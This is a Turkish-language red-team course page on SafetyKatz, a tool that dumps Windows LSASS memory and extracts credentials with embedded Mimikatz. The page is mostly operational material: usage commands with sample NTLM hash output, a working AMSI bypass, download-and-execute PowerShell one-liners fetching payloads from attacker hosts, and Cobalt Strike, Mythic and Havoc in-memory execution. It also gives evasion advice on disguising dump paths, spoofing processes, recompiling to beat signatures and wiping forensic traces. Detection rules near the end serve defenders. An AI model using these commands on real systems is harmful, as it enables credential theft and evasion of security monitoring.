# SafetyKatz

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Will Schroeder (@harmj0y) tarafından GhostPack projesi kapsamında geliştirilen; Windows `MiniDumpWriteDump` API'sini kullanarak LSASS sürecinin bellek dökümünü geçici bir dosyaya alan ve diskte hiçbir zaman `mimikatz.exe` çalıştırmadan, gömülü şifreli Mimikatz ikilisini doğrudan bellek içinde (In-Memory PE Loader) yürüterek kimlikleri ayrıştıran C# tabanlı post-exploitation aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory sızma testlerinde yerel yönetici hakları elde edildikten sonra en sık karşılaşılan engellerden biri, antivirüs ve EDR yazılımlarının `mimikatz.exe` ikilisini hem disk üzerinde hem de canlı bellek taramalarında statik imzalarla anında yakalamasıdır. Doğrudan canlı `lsass.exe` sürecine kancalar atarak bellek okumak (`sekurlsa::logonpasswords`) uç nokta güvenlik ajanlarının sezgisel alarmlarını tetikler.

**`SafetyKatz`**, bu tespit mekanizmalarını aşmak ve C2 çatıları (Cobalt Strike, Mythic, Havoc) üzerinden dosyasız (`execute-assembly`) yürütme sağlamak için iki farklı yaklaşımı birleştirir:

1. **İkili Ayrımı ve Çevrimdışı Bellek Ayrıştırması:** Doğrudan canlı LSASS sürecine `sekurlsa` enjekte etmek yerine, Windows'un meşru `dbghelp.dll` kütüphanesi içindeki `MiniDumpWriteDump` Win32 API'sini çağırarak `lsass.exe` sürecinin minidump dosyasını geçici bir dizine (`%TEMP%\debug<GUID>.bin`) yazar.
2. **Gömülü Şifreli PE Yükleyici (In-Memory PE Loading):** Kod içerisine XOR ile şifrelenmiş ve küçültülmüş bir Mimikatz ikilisi byte dizisi olarak gömülmüştür. SafetyKatz çalıştığında bu diziyi bellek içinde çözer, kendi yazdığı PE yükleyici (PELoader) aracılığıyla belleğe haritalar ve Mimikatz'a şu komutları argüman olarak iletir:
   - `sekurlsa::minidump <geçici_dmp_yolu>`
   - `sekurlsa::logonpasswords`
   - `exit`
3. **Anında Temizlik (Self-Cleanup):** Mimikatz kimlikleri bellekten çekip konsola yazdırdıktan hemen sonra, geçici minidump dosyası disk üzerinden derhal kalıcı olarak silinir (`File.Delete`).

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│             SALDIRGAN / C2 BEACON (execute-assembly)                   │
│                                                                        │
│  [ SafetyKatz.exe (.NET / C#) ]                                        │
│         │                                                              │
│         ├── (1) SeDebugPrivilege Talebi Edin                             │
│         │                                                              │
│         ├── (2) Process.GetProcessesByName("lsass")[0].Id              │
│         │                                                              │
│         ├── (3) MiniDumpWriteDump API Çağrısı (dbghelp.dll)             │
│         │         │                                                    │
│         │         ▼                                                    │
│         │   [ %TEMP%\debug<GUID>.bin Oluşturulur ]                     │
│         │                                                              │
│         ├── (4) Gömülü Mimikatz Baytlarını Bellekte XOR ile Çöz        │
│         │                                                              │
│         ├── (5) Bellek İçi Yükleme (In-Memory PELoader / RunPE)         │
│         │         │                                                    │
│         │         ▼ (sekurlsa::minidump + sekurlsa::logonpasswords)    │
│         │   [ Minidump Dosyası Bellek İçinde Çözümlenir ]              │
│         │                                                              │
│         └── (6) Anında Temizlik: File.Delete("%TEMP%\debug<GUID>.bin") │
│                   │                                                    │
│                   ▼                                                    │
│             [ Konsola NTLM / Kerberos Kimlikleri Dökülür ]             │
└────────────────────────────────────────────────────────────────────────┘
```

### 1.1 C# Bellek İçi PE Yükleyicisi (PELoader) Çalışma İlkeleri

SafetyKatz'ın kalbinde, yönetilen bir .NET süreci içerisinde yönetilmeyen (unmanaged) bir Win32 PE dosyasını çalıştırmayı sağlayan özel bir C# PE yükleyici yer alır. İşletim sistemi `CreateProcess` çağrısı yapmadan PE dosyasını RAM'e yerleştirirken şu adımları işletir:
1. **Bellek Tahsisi (`VirtualAlloc`):** Mimikatz'ın `IMAGE_OPTIONAL_HEADER.SizeOfImage` değeri kadar bellek alanı `MEM_COMMIT | MEM_RESERVE` ve `PAGE_EXECUTE_READWRITE` bayraklarıyla ayrılır.
2. **Bölümlerin Kopyalanması (Section Mapping):** Dosya başlıkları (`IMAGE_DOS_HEADER`, `IMAGE_NT_HEADERS`) ve ardından PE bölümleri (`.text`, `.data`, `.rdata`, `.reloc`) belirlenen `VirtualAddress` ofsetlerine kopyalanır.
3. **İçeri Aktarım Tablosu Çözümleme (IAT - Import Address Table):** PE'nin ihtiyaç duyduğu harici DLL'ler (`kernel32.dll`, `advapi32.dll` vb.) `LoadLibraryA` ile belleğe alınır ve fonksiyon adresleri `GetProcAddress` ile bulunarak IAT tablosuna yazılır.
4. **Temel Yeniden Konumlandırma (Base Relocation):** Mimikatz'ın tercih ettiği taban adresi (ImageBase) ile `VirtualAlloc` tarafından tahsis edilen gerçek adres arasındaki fark hesaplanır ve `.reloc` tablosundaki tüm işaretçiler yamalanır.
5. **Giriş Noktasına Atlama (Execution):** Bir C# temsilcisi (delegate) tanımlanarak `AddressOfEntryPoint` adresine yürütme akışı aktarılır.

### 1.2 XOR Şifreleme ve AMSI Korumaları

SafetyKatz'ın orijinal sürümünde Mimikatz ikilisi tek baytlık bir XOR anahtarı ile şifrelenmiştir. Ancak modern Windows sistemlerinde:
- **AMSI (Antimalware Scan Interface):** C# assembly'si belleğe yüklenirken `AmsiScanBuffer` fonksiyonu IL bayt kodunu tarar. SafetyKatz'ın kamuya açık imzaları AMSI tarafından doğrudan engellenir.
- **Çözüm:** Operatörlerin SafetyKatz'ı çalıştırmadan önce AMSI bellek yamalama (AMSI Bypass) uygulaması veya kaynak kodundaki XOR algoritmasını çok baytlı AES/RC4 şifrelemeyle değiştirip yeniden derlemesi gerekir.

---

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Disksiz Mimikatz İcrası** | `mimikatz.exe` asla dosya sistemine kaydedilmez; yalnızca RAM'de çalışır. | Disk tabanlı statik antivirüs taramalarını (AV Signature Scan) tamamen atlatır. |
| **Canlı Belleğe Dokunmama** | Doğrudan LSASS'a kanca atmaz; salt-okunur minidump dosyasını inceler. | LSASS çökme riskini sıfırlar ve `PROCESS_VM_READ` sezgisel alarmlarını azaltır. |
| **Cobalt Strike Entegrasyonu**| .NET assembly formatında derlendiğinden `execute-assembly` için optimize edilmiştir. | Diske dosya bırakmadan hedef süreç içine uzaktan bellek enjeksiyonu ile çalıştırılır. |
| **Otomatik Dosya İmhası** | İşlem tamamlandığında oluşturulan minidump dosyasını milisaniyeler içinde siler. | Olay müdahale (IR) ekiplerinin adli analizde ham döküm dosyasını bulmasını zorlaştırır. |

### Karşılaştırma Tablosu

| Kriter | SafetyKatz | Mimikatz (Klasik) | SharpKatz | Dumpert |
|---|---|---|---|---|
| **Geliştirme Dili** | C# (.NET) | Yerel C / C++ | C# (.NET) | C / ASM (Direct Syscall) |
| **Hedef Diskte Dosya** | Yalnızca geçici `.bin` | `mimikatz.exe` diske yazılabilir | Dosyasız | Yalnızca `dumpert.dmp` |
| **Mimikatz Bağımlılığı** | Var (Gömülü PE olarak) | Aracın kendisi | Yok (C# ile yeniden yazım) | Yok (Yalnızca döküm alır) |
| **Yürütme Yöntemi** | `execute-assembly` uyumlu | EXE / Reflective DLL | `execute-assembly` uyumlu | EXE / DLL / BOF |
| **EDR Yakalanma Seviyesi**| Orta (MiniDump imzası) | Aşırı Yüksek | Düşük - Orta | Düşük |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

SafetyKatz, taktiksel sadelik prensibiyle tasarlanmıştır. Çoğu operasyonda herhangi bir komut satırı argümanı gerektirmeden varsayılan güvenli parametrelerle çalışır:

```cmd
SafetyKatz.exe [isteğe_bağlı_minidump_dosya_adı]
```

### Parametre ve Yürütme Detayları

| Parametre / Girdi | Açıklama | Varsayılan Değer |
|---|---|---|
| *(Parametresiz)* | LSASS PID'sini otomatik bulur, `%TEMP%` altına rastgele GUID ile döküm alır, ayrıştırır ve siler. | `%TEMP%\debug<GUID>.bin` |
| `<dosya_adı>` | Dökümün yazılacağı özel dosya yolu veya adı belirtilir. | Otomatik GUID |
| `execute-assembly` | Cobalt Strike beacon konsolunda doğrudan bellek içi çalıştırma sözdizimi. | `execute-assembly SafetyKatz.exe` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Bağımsız Yönetici Komut İsteminde Çalıştırma

Yönetici ayrıcalıklarına sahip bir komut isteminde SafetyKatz çalıştırılır. Araç `SeDebugPrivilege` ayrıcalığını açar, dökümü alır, ayrıştırır ve temizler.

```cmd
SafetyKatz.exe
```

**Konsol Çıktısı Analizi:**

```text
[*] SafetyKatz by @harmj0y
[*] Finding lsass.exe PID...
[+] Found lsass.exe at PID 672
[*] Dumping lsass.exe to C:\Users\ADMINI~1\AppData\Local\Temp\debug9c72e1fa-b561-419b-a3c0-3b98c56e2978.bin
[+] Successfully dumped lsass.exe
[*] Loading embedded Mimikatz PE into memory...
[*] Executing 'sekurlsa::minidump ...' and 'sekurlsa::logonpasswords'...

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
  ## / \ ##  /* * *
  ## \ / ##   Benjamin DELPY `gentilkiwi`
  '## v ##'   http://blog.gentilkiwi.com/mimikatz

Authentication Id : 0 ; 184592 (00000000:0002d110)
Session           : Interactive from 1
User Name         : Administrator
Domain            : CORP
Logon Server      : DC01
SID               : S-1-5-21-2559786414-2279769532-2164155192-500
        msv1_0 :
         * NTLM     : 01fc5a6be7bc6929c40372d23f5052b3
        wdigest :
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : CORP.LOCAL

[*] Deleting C:\Users\ADMINI~1\AppData\Local\Temp\debug9c72e1fa-b561-419b-a3c0-3b98c56e2978.bin
[+] Successfully deleted dump file!
```

---

### Senaryo 2: Cobalt Strike C2 Üzerinden Dosyasız Yürütme (`execute-assembly`)

Saldırgan, kurban makinede hiçbir dosya oluşturmadan Beacon oturumu üzerinden `SafetyKatz.exe` ikilisini bellekten çalıştırır.

```text
beacon> execute-assembly /opt/GhostPack/SafetyKatz.exe
```

---

### Senaryo 3: PowerShell Reflection ile Belleğe Yükleme ve Çağırma

Web sunucusundan indirilen bayt dizisi doğrudan PowerShell oturumunun belleğine haritalanır ve diske dokunulmadan `Main` metodu tetiklenir.

```powershell
$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.1.100/SafetyKatz.bin')
[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, (, [string[]]@()))
```

---

### Senaryo 4: Özel Dosya Adı ile Döküm Alma (Farklı Dizin Yönlendirmesi)

`%TEMP%` dizinini sıkı takip eden bir DLP/EDR yazılımı varsa, döküm dosyasının adı ve yolu parametre olarak değiştirilir.

```cmd
SafetyKatz.exe C:\ProgramData\Oracle\cache_sync.tmp
```

---

### Senaryo 5: AMSI Bellek Baypası ile Birlikte PowerShell İcrası

PowerShell oturumunda AMSI tarayıcısını bellek üzerinde etkisiz hale getirdikten sonra SafetyKatz'ı belleğe alıp çalıştırma:

```powershell
# AmsiScanBuffer bellek yamalama
$Amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Field = $Amsi.GetField('amsiInitFailed', 'NonPublic,Static')
$Field.SetValue($null, $True)

# SafetyKatz'ı belleğe yükleyip çalıştırma
$skBytes = [System.IO.File]::ReadAllBytes("C:\Tools\SafetyKatz.exe")
[System.Reflection.Assembly]::Load($skBytes).EntryPoint.Invoke($null, $null)
```

---

### Senaryo 6: Mythic C2 Çatısında `inline-assembly` ile Süreç Başlatmadan İcra

Yeni bir süreç (spawnto) oluşturma izlerini tamamen yok etmek için ajanın kendi belleğinde çalıştırma:

```text
mythic> inline_assembly -assembly /tmp/SafetyKatz.exe
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `[!] SeDebugPrivilege failed to enable` | Komut istemi veya Beacon yeterli yerel yönetici haklarına sahip değil (UAC kısıtlaması). | Komut istemini "Yönetici Olarak Çalıştır" ile başlatın veya UAC Bypass uygulayın. |
| `[-] MiniDumpWriteDump returned FALSE` | Hedef sistemde `RunAsPPL` (Protected Process Light) koruması devrede veya EDR `MiniDumpWriteDump` API kancası koymuş. | PPL korumasını aşmak için `PPLMedic` veya doğrudan sistem çağrısı yapan `Dumpert` / `nanodump` aracına geçin. |
| `AMSI / Defender detected Trojan:Win32/Mimikatz.embedded` | SafetyKatz içerisindeki gömülü XOR anahtarı ve byte dizgisi antivirüs imzalarına yakalandı. | SafetyKatz kaynak kodundaki XOR anahtarını ve değişken isimlerini değiştirip projeyi yeniden derleyin (`Re-obfuscation`). |
| `[-] Failed to delete dump file: Access Denied` | Döküm dosyası henüz bellek içi Mimikatz tarafından serbest bırakılmadı veya antivirüs tarafından karantinaya alındı. | Dosyayı PowerShell `Remove-Item -Force` ile manuel temizleyin; süreç kilitlerini inceleyin. |
| `User Name: (null) / Credentials empty` | Hedef makinede Windows Defender Credential Guard (VBS/IUM) aktif; sırlar `LsaIso.exe` içinde saklanıyor. | Credential Guard devredeyken bellek dökümü NTLM/Kerberos sırlarını vermez; DPAPI veya token hırsızlığı tekniklerine yönelin. |
| `PELoader Exception: Base relocation failed` | Hedef sistem mimarisi (x86 vs x64) ile gömülü Mimikatz derlemesi uyuşmuyor. | SafetyKatz'ın x64 olarak derlendiğinden ve x64 bir Windows üzerinde çalıştığından emin olun. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: ORTA (MINIDUMPWRITE DUMP & TEMEL İMZALAR)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4672 (Admin Logon), Event ID 4688 (Process)
[ Sysmon ]          : Event ID 10 (ProcessAccess -> lsass.exe), Event ID 11
[ Dosya İzi ]       : %TEMP%\debug*.bin (Oluşturulup Anında Silinen Dosya)
[ Bellek Analizi ]  : .NET CLR Yüklemesi, Bellek İçi Mimikatz Stringleri
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Sysmon Event ID 10 (Process Access):**
   - SafetyKatz sürecinin `lsass.exe` sürecine `MiniDumpWriteDump` çağrısı yapmak için `0x1010` veya `0x1fffff` erişim hakkı ile handle açması.
2. **Sysmon Event ID 11 (FileCreate) ve Event ID 23 (FileDelete):**
   - `%TEMP%\debug<GUID>.bin` dosyasının oluşturulması ve hemen ardından silinmesi. Bu hızlı dosya oluşturma/silme örüntüsü modern SIEM sistemlerinde doğrudan bir alarm indikatörüdür.
3. **.NET Runtime Yükleme İzleri:**
   - Standart bir sistem sürecine (örneğin `wmic.exe` veya `rundll32.exe`) `execute-assembly` ile enjekte edildiğinde `clr.dll` ve `mscorlib.dll` kütüphanelerinin yüklenmesi (*Unusual CLR Loading*).

### 5.2 Ağ ve EDR İmzaları

- **MiniDumpWriteDump API İmzası:** EDR ajanları `dbghelp.dll` içerisindeki `MiniDumpWriteDump` fonksiyonunu kullanıcı alanında (Userland) kancalayarak hedef parametresi `lsass.exe` olan tüm çağrıları doğrudan engeller.
- **Bellek İçi Mimikatz Dizgileri:** Mimikatz bellek içinde XOR ile çözüldüğünde, `gentilkiwi`, `sekurlsa`, `mimikatz` gibi karakteristik metin dizgileri taranabilir hale gelir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1003.001** | OS Credential Dumping: LSASS Memory | `MiniDumpWriteDump` ile bellek dökümü alma ve ayrıştırma. |
| **T1070.004** | Indicator Removal: File Deletion | Döküm dosyasının ayrıştırmadan hemen sonra silinmesi. |
| **T1620** | Reflective Code Loading | Bellek içi PE yükleyici ile Mimikatz'ın diske basılmadan çalıştırılması. |
| **T1059.001** | Command and Scripting Interpreter: PowerShell | PowerShell reflection ile bellekten çağrılabilme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Gömülü İmza Yakalanması** | Hazır derlenmiş `SafetyKatz.exe` ikilisini asla kullanmayın. Kaynak kodundaki şifreleme anahtarını, PE yükleyici fonksiyon adlarını değiştirip Visual Studio ile yeniden derleyin. |
| **Geçici Dosya İzi** | Dökümün yazıldığı dosya yolunu varsayılan `%TEMP%` yerine meşru yazılımların çalıştığı geçici dizinlere yönlendirin. |
| **MiniDump API Kancası** | EDR engellemesi varsa `SafetyKatz` yerine doğrudan sistem çağrısı (Syscalls) kullanan `Dumpert` veya `nanodump` araçlarını tercih edin. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma & YARA)

**YARA Kuralı — Bellekte Gömülü Mimikatz Yükleyici Kalıbı Tespiti:**

```yara
rule Suspicious_SafetyKatz_Assembly {
    meta:
        description = "Detects SafetyKatz .NET assembly based on unique string artifacts and PELoader logic"
        author = "Active Directory Security Project"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "SafetyKatz" ascii wide nocase
        $s2 = "sekurlsa::minidump" ascii wide
        $s3 = "Loading embedded Mimikatz" ascii wide
        $s4 = "MiniDumpWriteDump" ascii
    condition:
        3 of them
}
```

**Sigma Kuralı — Temp Dizininde Şüpheli Minidump Dosyası Tespiti:**

```yaml
title: Suspicious LSASS Minidump Creation in Temp Folder
status: experimental
description: Detects the creation of suspicious bin or dmp files in user Temp directory matching SafetyKatz patterns.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 11
    TargetFilename|contains: '\AppData\Local\Temp\debug'
    TargetFilename|endswith: '.bin'
  condition: selection
level: high
```

**Microsoft Sentinel (KQL) — Hızlı Dosya Oluşturma ve Silme Anomalisi:**

```kql
DeviceFileEvents
| where FolderPath has @"\AppData\Local\Temp"
| where FileName startswith "debug" and FileName endswith ".bin"
| summarize Actions = make_set(ActionType), TimeDiff = max(TimeGenerated) - min(TimeGenerated) by DeviceName, FileName
| where Actions has "FileCreated" and Actions has "FileDeleted"
| where TimeDiff < timespan(5s)
| project DeviceName, FileName, Actions, TimeDiff
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Standart Tam Otomatik Kimlik Dökümü
```cmd
SafetyKatz.exe
```
- **Ne Yapar?** `SeDebugPrivilege` alır, LSASS PID'sini bulur, geçici döküm alır, bellekte Mimikatz çalıştırarak kimlikleri basar ve dökümü siler.
- **Ne Zaman Kullanılır?** Yönetici haklarına sahip olunan bir sistemde hızla kimlik toplamak için.
- **Parametreler:** Ek parametre gerektirmez, tam otomatiktir.

### Komut 2: Cobalt Strike ile Bellek İçi Çalıştırma
```text
beacon> execute-assembly SafetyKatz.exe
```
- **Ne Yapar?** SafetyKatz ikilisini diske yazmadan doğrudan Beacon belleği üzerinden bir alt süreçte yürütür.
- **Ne Zaman Kullanılır?** C2 operasyonlarında disk tabanlı EDR alarmlarını tetiklememek için.
- **Parametreler:** `execute-assembly`: Cobalt Strike .NET bellek yükleme komutu.

### Komut 3: Özel Dosya Yolu Belirterek Döküm Alma
```cmd
SafetyKatz.exe C:\Windows\Temp\perfmon_report.tmp
```
- **Ne Yapar?** Döküm dosyasını varsayılan `%TEMP%` yerine belirtilen ad ve konuma yazar, analiz eder ve temizler.
- **Ne Zaman Kullanılır?** Kullanıcı Temp klasörünü sıkı izleyen dosya bütünlük sensörlerini atlatmak için.
- **Parametreler:** `C:\Windows\Temp\perfmon_report.tmp`: Özel döküm dosya yolu.

### Komut 4: PowerShell Reflection ile Uzaktan Bellek İçi İcra
```powershell
[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://10.10.10.5/sk.bin')).EntryPoint.Invoke($null,$null)
```
- **Ne Yapar?** Uzak sunucudaki SafetyKatz baytlarını ağdan doğrudan RAM'e yükler ve çalıştırır.
- **Ne Zaman Kullanılır?** Kurban makineye dosya indirmeden PowerShell oturumu üzerinden hızlı döküm almak için.
- **Parametreler:** `DownloadData`: Bayt indirme, `EntryPoint.Invoke`: Ana metodu tetikleme.

### Komut 5: Farklı Süreç Altında Gizli Çalıştırma (Spawnto)
```text
beacon> spawnto C:\Windows\System32\werfault.exe
beacon> execute-assembly SafetyKatz.exe
```
- **Ne Yapar?** SafetyKatz'ın `werfault.exe` (Windows Hata Bildirimi) süreci altında çalışmasını sağlar.
- **Ne Zaman Kullanılır?** EDR'ın alışılmadık süreçlerden gelen LSASS handle çağrılarını incelediği durumlarda meşru hata bildirimi sürecini taklit etmek için.
- **Parametreler:** `spawnto`: Beacon'ın alt süreç şablonunu belirler.

### Komut 6: WinRM Oturumu Üzerinden Uzaktan Tetikleme
```powershell
Invoke-Command -ComputerName TargetPC -ScriptBlock { C:\Tools\SafetyKatz.exe }
```
- **Ne Yapar?** WinRM (Port 5985) üzerinden uzak hedefte SafetyKatz'ı çalıştırır ve çıktısını yerel ekrana döker.
- **Ne Zaman Kullanılır?** Uzak yönetim yetkisine sahip olunan makinelerden parola çekmek için.
- **Parametreler:** `Invoke-Command`: Uzak PowerShell çalıştırma komutu.

### Komut 7: Özel GUID İsimlendirmeli Çıktıyı İzleme (Troubleshooting)
```cmd
SafetyKatz.exe C:\Users\Public\debug_test.bin > C:\Users\Public\output.log 2>&1
```
- **Ne Yapar?** Hata ayıklama amacıyla tüm konsol ve hata akışlarını bir metin dosyasına yönlendirir.
- **Ne Zaman Kullanılır?** SafetyKatz sessizce çöktüğünde veya yetki hatası aldığında nedenini analiz etmek için.
- **Parametreler:** `> C:\Users\Public\output.log 2>&1`: Standart çıktı ve hata yönlendirmesi.

### Komut 8: Mythic C2 Çatısında Bellek İçi Yürütme
```text
mythic> inline_assembly -assembly SafetyKatz.exe
```
- **Ne Yapar?** Mythic C2 ajanı içinde yeni süreç başlatmadan mevcut süreç içinde Assembly icrası yapar.
- **Ne Zaman Kullanılır?** Süreç oluşturma (Process Creation - Event 4688) loglarını sıfırlamak için.
- **Parametreler:** `inline_assembly`: Süreç içi assembly yükleyicisi.

### Komut 9: Havoc C2 Çatısında Dotnet Inline Yürütme
```text
havoc> dotnet inline-execute /opt/tools/SafetyKatz.exe
```
- **Ne Yapar?** Havoc Demon ajanı içinde süreç başlatmadan bellek içi CLR çalıştırması yapar.
- **Ne Zaman Kullanılır?** Modern EDR'ların fork-and-run modellerini yakaladığı ortamlarda.
- **Parametreler:** `dotnet inline-execute`: Havoc C2 .NET icra komutu.

### Komut 10: Dökümün Alınamadığı Durumda Elle Silme Temizliği
```cmd
del /f /q %TEMP%\debug*.bin
```
- **Ne Yapar?** Hata nedeniyle SafetyKatz'ın silemediği artık döküm dosyalarını zorla temizler.
- **Ne Zaman Kullanılır?** Süreç beklenmedik şekilde sonlandığında adli kalıntı bırakmamak için.
- **Parametreler:** `/f`: Salt-okunur dosyaları zorla sil, `/q`: Onay isteme.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [GhostPack / SafetyKatz](https://github.com/GhostPack/SafetyKatz)
- **Harmj0y Blog:** [SafetyKatz and In-Memory Mimikatz Execution](https://blog.harmj0y.net/)
- **MITRE ATT&CK Referansı:** [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- **TheRealWover / MiniDump Araştırması:** [Dumping LSASS with MiniDumpWriteDump](https://twitter.com/TheRealWover)

---

> **Önceki:** [← lsassy](./lsassy.md) · **Sonraki:** [SharpKatz →](./SharpKatz.md)
